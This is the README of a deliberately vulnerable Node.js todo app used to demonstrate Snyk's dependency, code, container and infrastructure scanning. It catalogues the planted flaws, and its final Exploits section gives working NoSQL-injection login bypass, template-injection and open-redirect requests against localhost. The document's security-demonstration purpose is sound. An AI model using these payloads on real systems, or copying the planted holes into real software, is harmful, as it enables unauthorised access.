# nodejs-goof — Snyk Security Demo Application

A vulnerable Node.js todo app used to demonstrate every Snyk product: **Open Source (SCA)**, **Code (SAST)**, **Container**, and **Infrastructure as Code (IaC)**.

Based on the [Dreamers Lab tutorial](http://dreamerslab.com/blog/en/write-a-todo-list-with-express-and-mongodb/), extended with workspaces, audit logging, webhooks, and automation rules.

---

## Table of Contents

- [Quick Start](#quick-start)
- [Project Structure](#project-structure)
- [Snyk Scanning](#snyk-scanning)
  - [Run All Scans](#run-all-scans)
  - [Open Source (SCA)](#open-source-sca)
  - [Code (SAST)](#code-sast)
  - [Infrastructure as Code (IaC)](#infrastructure-as-code-iac)
  - [Container](#container)
  - [Target Merging (snykCodeNormaliseRemoteUrl)](#target-merging-snykcodeNormaliseRemoteUrl)
- [CI/CD Pipelines](#cicd-pipelines)
- [Application Features](#application-features)
- [Intentional Vulnerabilities](#intentional-vulnerabilities)
  - [Vulnerable Dependencies (SCA)](#vulnerable-dependencies-sca)
  - [Code Vulnerabilities (SAST)](#code-vulnerabilities-sast)
  - [Infrastructure Misconfigurations (IaC)](#infrastructure-misconfigurations-iac)
- [Snyk Policy File (.snyk)](#snyk-policy-file-snyk)
- [Exploits](#exploits)

---

## Quick Start

### Prerequisites

- Node.js 18+
- MongoDB 3.x (required by legacy dependencies)
- [Snyk CLI](https://docs.snyk.io/snyk-cli/install-or-update-the-snyk-cli) authenticated (`snyk auth`)
- Docker (optional, for container scanning)

### Run locally

```bash
# Start MongoDB (via Docker or locally)
docker run --rm -p 27017:27017 mongo:3

# Clone, install, and start
git clone https://github.com/Snyk-Integration-App/nodejs-goof.git
cd nodejs-goof
npm install
npm start
```

The app listens on [http://localhost:3001](http://localhost:3001).

### Run with Docker Compose

```bash
docker-compose up --build
docker-compose down
```

---

## Project Structure

```
nodejs-goof/
├── app.js                          # Express app entry point
├── mongoose-db.js                  # Mongoose schemas and DB connection
├── typeorm-db.js                   # TypeORM entity setup
├── package.json                    # Dependencies (many intentionally vulnerable)
├── Dockerfile                      # Vulnerable base image (node:14.18.1)
├── docker-compose.yml              # App + MongoDB + MySQL
├── vulnerable.tf                   # Terraform with security misconfigs
├── .snyk                           # Snyk policy: excludes and ignores
│
├── routes/
│   ├── index.js                    # Core routes (login, todos, CRUD)
│   ├── api.js                      # REST API router
│   ├── workspaces.js               # Workspace CRUD + membership
│   ├── workspace-todos.js          # Workspace-scoped todo CRUD
│   ├── audit.js                    # Audit log API
│   ├── webhooks.js                 # Webhook management API
│   ├── rules.js                    # Automation rules API
│   ├── todo-import.js              # CSV todo import
│   ├── users.js                    # User routes
│   └── xss-vulnerable.js           # XSS demo endpoints
│
├── services/
│   ├── rule-engine.js              # Condition eval, action execution, cron scheduler
│   ├── webhook-delivery.js         # In-memory queue, HMAC-signed POST, retries
│   ├── workspace-auth.js           # Membership and role checks
│   └── audit.js                    # Audit event creation
│
├── middleware/
│   └── api-auth.js                 # API authentication middleware
│
├── scripts/
│   ├── snyk-scan-all.sh            # Run every Snyk scan with dashboard upload
│   ├── audit-retention.js          # Delete audit events older than N days
│   └── test-terraform.sh           # Validate Terraform config
│
├── .github/workflows/
│   └── snyk-sca-sast-demo.yml      # GitHub Actions: SCA + SAST pipeline
│
├── azure-pipelines-snyk-sca-sast-demo.yml  # Azure DevOps equivalent
│
├── docs/
│   ├── API.md                      # Full REST API reference
│   ├── ARCHITECTURE-WORKSPACES.md  # Architecture: workspaces, audit, webhooks, rules
│   └── snyk-dashboard-upload-commands.md  # CLI upload commands + target merging
│
├── exploits/                       # Step-by-step exploit demos
├── views/                          # EJS + Handlebars templates
└── public/                         # Static assets
```

---

## Snyk Scanning

### Run All Scans

A single script runs every Snyk scan type, uploads results to the dashboard, and uses `--remote-repo-url` so that SCA and Code results merge into the same target (requires the `snykCodeNormaliseRemoteUrl` feature flag).

```bash
./scripts/snyk-scan-all.sh
```

Options:

```
--org ORG_ID          Snyk org ID (default: from script)
--repo-url REPO_URL   Remote repo URL for target merging
--skip-container      Skip Docker build and container scanning
```

The script runs these scans in order:

| # | Scan Type | Command | What It Does |
|---|---|---|---|
| 1 | **SCA** (local) | `snyk test` | Tests npm dependencies for known vulns |
| 2 | **SCA** (dashboard) | `snyk monitor` | Uploads dependency snapshot to Snyk dashboard |
| 3 | **SAST** (local) | `snyk code test` | Analyzes first-party JavaScript code for security issues |
| 4 | **SAST** (dashboard) | `snyk code test --report` | Uploads SAST results to Snyk dashboard |
| 5 | **IaC** (local) | `snyk iac test` | Checks `vulnerable.tf` for misconfigurations |
| 6 | **IaC** (dashboard) | `snyk iac test --report` | Uploads IaC results to Snyk dashboard |
| 7 | **Container** (build) | `docker build` | Builds the Docker image |
| 8 | **Container** (local) | `snyk container test` | Scans image for OS-level vulns |
| 9 | **Container** (dashboard) | `snyk container monitor` | Uploads container results to Snyk dashboard |

### Open Source (SCA)

```bash
# Local test — find vulnerable dependencies
snyk test --severity-threshold=high

# Upload to dashboard for continuous monitoring
snyk monitor --remote-repo-url="https://github.com/Snyk-Integration-App/nodejs-goof"
```

### Code (SAST)

```bash
# Local test — find code-level vulnerabilities
snyk code test --severity-threshold=high

# Upload to dashboard
snyk code test --report \
  --remote-repo-url="https://github.com/Snyk-Integration-App/nodejs-goof" \
  --project-name="sast"
```

### Infrastructure as Code (IaC)

```bash
# Local test
snyk iac test vulnerable.tf

# Upload to dashboard
snyk iac test vulnerable.tf --report
```

### Container

```bash
# Build the image
docker build -t nodejs-goof:latest .

# Local test
snyk container test nodejs-goof:latest --file=Dockerfile

# Upload to dashboard
snyk container monitor nodejs-goof:latest --file=Dockerfile --project-name="container/nodejs-goof"
```

### Target Merging (`snykCodeNormaliseRemoteUrl`)

By default, `snyk monitor` (SCA) and `snyk code test --report` (SAST) create separate targets in the Snyk dashboard even for the same repo. The `snykCodeNormaliseRemoteUrl` feature flag fixes this.

**How to enable:**

1. Activate the `snykCodeNormaliseRemoteUrl` feature flag on your Snyk org/group.
2. Use the same `--remote-repo-url` for both SCA and Code uploads.
3. Clean up any existing duplicate targets via the Snyk UI or API.

The `scripts/snyk-scan-all.sh` script already uses `--remote-repo-url` consistently across SCA and Code so results merge into a single target.

**Limitations:**
- SCM Import + CLI Upload merge is **not available** yet.
- Custom `--target-name` for Open Source CLI is **not supported** (expected with Dragonfly).

See [docs/snyk-dashboard-upload-commands.md](docs/snyk-dashboard-upload-commands.md) for full details.

---

## CI/CD Pipelines

### GitHub Actions

`.github/workflows/snyk-sca-sast-demo.yml` runs SCA and SAST on push to main and on manual dispatch.

**Required secrets:** `SNYK_TOKEN`

### Azure DevOps

`azure-pipelines-snyk-sca-sast-demo.yml` is the Azure DevOps equivalent with the same SCA + SAST stages.

**Required variables:** `SNYK_TOKEN`, `SNYK_ORG_ID`

Both pipelines run in report-only mode by default (don't block the build). Uncomment the blocking steps to enforce gating on high/critical vulnerabilities.

---

## Application Features

### Workspaces and Multi-Tenancy

Multi-tenant workspaces with role-based access (`owner`, `admin`, `member`, `viewer`). Each workspace has its own todos, audit log, webhooks, and automation rules. Authentication is via `X-User-Id` header or session.

### Audit Log

Every mutation (todo CRUD, workspace updates, member changes) creates an audit event with actor, action, resource, IP, and timestamp. Paginated and filterable via the API. Optional retention cleanup via `node scripts/audit-retention.js [days]`.

### Webhooks

Workspace-scoped outbound webhooks. On each audited event, the app POSTs a JSON payload with `X-Webhook-Signature: sha256=<hmac-hex>` to registered URLs. Timeout 15s, payload capped at 100kb, retries up to 3x with exponential backoff.

### Automation Rules

Condition-based rules triggered by `todo.created`, `todo.updated`, or a cron `schedule`. Actions: `send_webhook` (POST to URL) or `update_todos` (bulk update matching todos). Max 50 rules per workspace, 5 actions per rule.

### API

Full REST API at `/api`. See [docs/API.md](docs/API.md) for the complete reference.

---

## Intentional Vulnerabilities

This project contains intentional security vulnerabilities across multiple scan types for demonstration purposes.

### Vulnerable Dependencies (SCA)

The `package.json` includes packages with known vulnerabilities:

| Package | Vulnerability |
|---|---|
| `mongoose` 6.13.6 | Buffer Memory Exposure |
| `st` 0.2.4 | Directory Traversal |
| `ms` 0.7.1 | ReDoS |
| `marked` 0.3.5 | XSS |
| `adm-zip` 0.4.7 | Zip Slip |
| `lodash` 4.17.4 | Prototype Pollution |
| `ejs` 1.0.0 | Code Injection |
| `express` 4.12.4 | Multiple (outdated) |

### Code Vulnerabilities (SAST)

First-party code issues that Snyk Code detects:

| File | Vulnerability |
|---|---|
| `routes/index.js` | NoSQL Injection, Open Redirect, Hardcoded Secrets |
| `app.js` | Hardcoded session secret, Insecure cookie config |
| `mongoose-db.js` | Hardcoded credentials (admin password) |

### Infrastructure Misconfigurations (IaC)

`vulnerable.tf` contains:
- Security group allowing SSH from `0.0.0.0/0`
- EC2 instance with unencrypted root volume
- Missing IMDSv2 enforcement
- Open egress rule

---

## Snyk Policy File (`.snyk`)

The `.snyk` file configures:

- **Excludes** — `routes/xss-vulnerable.js` and `tests/**` are excluded from Snyk Code scanning to avoid false positives from demo/test payloads.
- **Ignores** — Specific SCA vulnerabilities that have been reviewed and accepted (e.g., `adm-zip` Zip Slip, `lodash` Prototype Pollution).

Each ignore entry includes a reason and expiry date for audit purposes.

---

## Exploits

The `exploits/` directory contains step-by-step demonstrations:

**NoSQL Injection** — Login bypass via MongoDB `$gt` operator:
```bash
echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | \
  http --json http://localhost:3001/login
```

**Code Injection** — Server-side template injection via Handlebars `layout`:
```bash
curl -X POST --cookie c.txt --cookie-jar c.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin@snyk.io","password":"SuperSecretPassword"}' \
  http://localhost:3001/login

curl -X POST --cookie c.txt --cookie-jar c.txt \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}' \
  http://localhost:3001/account_details
```

**Open Redirect** — Unvalidated redirect:
```
http://localhost:3001/login?redirectPage=https://google.com
```

**Directory Traversal** — Via the `st` static file server.

**ReDoS** — Denial of service via `ms` and `validator` regex.

---

## Cleanup

```bash
npm run cleanup
```

Bulk deletes all TODO items from MongoDB.
